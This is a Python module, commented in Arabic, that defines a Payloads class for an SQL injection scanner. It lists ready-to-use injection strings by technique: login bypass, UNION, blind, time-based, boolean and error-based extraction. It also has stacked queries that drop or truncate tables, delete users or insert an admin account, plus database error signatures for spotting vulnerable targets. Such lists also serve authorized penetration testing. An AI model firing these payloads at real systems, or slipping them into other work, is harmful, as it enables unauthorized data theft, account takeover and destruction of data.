# SQL Injection Payloads
# قاموس الحمولات المستخدمة في الفحص

class Payloads:
    """فئة تحتوي على جميع الحمولات المستخدمة في الفحص"""
    
    # الحمولات الأساسية
    BASIC_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "' OR 1=1 --",
        "' OR 1=1 /*",
        "' OR 'a'='a",
        "' OR 'a'='a' --",
        "1' OR '1'='1",
        "1' OR '1'='1' --",
        "1' OR '1'='1' /*",
    ]
    
    # حمولات Union-based
    UNION_PAYLOADS = [
        "' UNION SELECT NULL --",
        "' UNION SELECT NULL,NULL --",
        "' UNION SELECT NULL,NULL,NULL --",
        "' UNION SELECT NULL,NULL,NULL,NULL --",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL --",
        "' UNION SELECT 1,2,3 --",
        "' UNION SELECT 1,2,3,4 --",
        "' UNION SELECT 1,2,3,4,5 --",
    ]
    
    # حمولات Blind SQL Injection
    BLIND_PAYLOADS = [
        "' AND '1'='1",
        "' AND '1'='2",
        "' AND 1=1 --",
        "' AND 1=2 --",
        "' AND SLEEP(5) --",
        "' AND BENCHMARK(5000000,SHA1('test')) --",
    ]
    
    # حمولات Time-based
    TIME_BASED_PAYLOADS = [
        "' AND SLEEP(5) --",
        "' AND SLEEP(10) --",
        "' AND BENCHMARK(10000000,SHA1('a')) --",
        "' OR SLEEP(5) --",
        "' OR SLEEP(10) --",
        "1' AND SLEEP(5) --",
        "1' AND SLEEP(10) --",
    ]
    
    # حمولات Boolean-based Blind
    BOOLEAN_PAYLOADS = [
        "' AND 1=1 --",
        "' AND 1=2 --",
        "' AND 'x'='x",
        "' AND 'x'='y",
        "1' AND 1=1 --",
        "1' AND 1=2 --",
        "' AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1 --",
    ]
    
    # حمولات Error-based
    ERROR_BASED_PAYLOADS = [
        "' AND extractvalue(1,concat(0x7e,(SELECT database()))) --",
        "' AND updatexml(1,concat(0x7e,(SELECT database())),1) --",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a) --",
        "' AND JSON_EXTRACT(1,1) --",
    ]
    
    # حمولات Stacked Queries
    STACKED_PAYLOADS = [
        "'; DROP TABLE users --",
        "'; DELETE FROM users --",
        "'; TRUNCATE TABLE logs --",
        "'; INSERT INTO users VALUES (1,'admin','pass') --",
    ]
    
    # حمولات Comment-based
    COMMENT_PAYLOADS = [
        "' --",
        "' #",
        "' /*",
        "' /*!50000",
        "' --%20",
        "' --%23",
    ]
    
    # الأخطاء الشائعة التي تدل على الثغرة
    ERROR_SIGNATURES = [
        "SQL syntax",
        "MySQL",
        "PostgreSQL",
        "SQLServer",
        "Oracle",
        "sqlite",
        "Unclosed quotation mark",
        "syntax error",
        "database error",
        "You have an error",
        "Warning: mysql",
        "Fatal error",
        "Parse error",
        "Exception",
    ]
    
    @staticmethod
    def get_all_payloads():
        """الحصول على جميع الحمولات"""
        return (
            Payloads.BASIC_PAYLOADS +
            Payloads.UNION_PAYLOADS +
            Payloads.BLIND_PAYLOADS +
            Payloads.TIME_BASED_PAYLOADS
        )
    
    @staticmethod
    def get_basic_payloads():
        """الحصول على الحمولات الأساسية فقط"""
        return Payloads.BASIC_PAYLOADS
    
    @staticmethod
    def get_advanced_payloads():
        """الحصول على جميع الحمولات المتقدمة"""
        return (
            Payloads.UNION_PAYLOADS +
            Payloads.BLIND_PAYLOADS +
            Payloads.TIME_BASED_PAYLOADS +
            Payloads.BOOLEAN_PAYLOADS +
            Payloads.ERROR_BASED_PAYLOADS +
            Payloads.STACKED_PAYLOADS
        )
